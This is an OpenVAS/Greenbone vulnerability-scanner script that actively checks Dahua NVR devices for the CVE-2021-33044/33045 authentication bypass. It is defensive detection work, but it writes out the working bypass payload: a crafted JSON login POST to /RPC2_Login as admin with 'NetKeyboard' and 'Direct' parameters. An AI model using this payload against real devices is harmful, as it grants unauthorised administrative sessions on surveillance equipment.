# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:dahua:nvr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.147196");
  script_version("2021-11-23T14:03:40+0000");
  script_tag(name:"last_modification", value:"2021-11-24 11:00:45 +0000 (Wed, 24 Nov 2021)");
  script_tag(name:"creation_date", value:"2021-11-23 04:22:06 +0000 (Tue, 23 Nov 2021)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-09-30 16:48:00 +0000 (Thu, 30 Sep 2021)");

  script_cve_id("CVE-2021-33044", "CVE-2021-33045");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Dahua Multiple Vulnerabilities (DHCC-SA-202106-001) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dahua_devices_http_detect.nasl");
  script_mandatory_keys("dahua/device/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Multiple Dahua devices (and their OEMs) are prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - CVE-2021-33044, CVE-2021-33045: Identity authentication bypass vulnerabilities during the login
  process");

  script_tag(name:"impact", value:"Attackers can bypass device identity authentication by
  constructing malicious data packets.");

  script_tag(name:"solution", value:"See the referenced vendor advisory for a solution.");

  script_xref(name:"URL", value:"https://www.dahuasecurity.com/support/cybersecurity/details/957");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2021/Oct/13");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/RPC2_Login";

host_url = http_report_vuln_url(port: port, url: "/", url_only: TRUE);

headers = make_array("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8",
                     "X-Requested-With", "XMLHttpRequest",
                     "Origin", host_url);

data = '{"id": 1, "method": "global.login", "params": {"authorityType": "Default", ' +
       '"clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", ' +
       '"passwordType": "Default", "userName": "admin"}, "session": 0}';

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers, referer_url: host_url);
res = http_keepalive_send_recv(port: port, data: req);

# { "id" : 1, "params" : null, "result" : true, "session" : 1227079251 }
# {"id":1,"params":{"keepAliveInterval":60},"result":true,"session":1209047460}
if (res =~ "^HTTP/1\.[01] 200" && res =~ '"result"\\s*:\\s*true,\\s*"session"\\s*:\\s*[0-9a-zA-Z]+\\s*\\}') {
  info['HTTP Method'] = "POST";
  info['Affected URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
  info['HTTP "POST" body'] = data;
  info['HTTP "Content-Type" header'] = headers["Content-Type"];
  info['HTTP "X-Requested-With" header'] = headers["X-Requested-With"];
  info['HTTP "Origin" header'] = headers["Origin"];

  report  = 'By doing the following HTTP request:\n\n';
  report += text_format_table(array: info) + '\n\n';
  report += 'it was possible to bypass authentication and receive a session ID.';
  report += '\n\nResult:\n\n' + res;
  expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
  security_message(port: port, data: report, expert_info: expert_info);
  exit(0);
}

exit(99);